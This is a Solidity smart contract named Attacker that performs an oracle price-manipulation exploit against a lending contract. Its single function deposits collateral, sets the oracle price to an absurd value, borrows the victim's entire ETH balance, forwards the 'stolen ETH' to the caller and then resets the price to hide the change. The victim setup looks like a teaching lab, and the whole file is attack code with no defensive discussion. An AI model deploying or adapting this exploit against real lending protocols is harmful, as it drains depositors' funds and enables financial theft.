// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVictim {
    function depositCollateral() external;
    function borrowETH(uint256 amount) external;
}

interface IOracle {
    function setPrice(uint256 price) external;
}

contract Attacker {
    IVictim public victim;
    IOracle public oracle;

    constructor(address _victim, address _oracle) {
        victim = IVictim(_victim);
        oracle = IOracle(_oracle);
    }

    function flashAttack() public {
        // 1. Get initial collateral
        victim.depositCollateral();

        // 2. MANIPULATE: Set Gold price to 1,000,000 ETH
        oracle.setPrice(1000000 ether);

        // 3. BORROW: Drain the bank
        uint256 bankBalance = address(victim).balance;
        victim.borrowETH(bankBalance);

        // 4. PROFIT: Send stolen ETH to you
        payable(msg.sender).transfer(address(this).balance);

        // 5. CLEANUP: Reset price
        oracle.setPrice(1 ether);
    }

    receive() external payable {}
}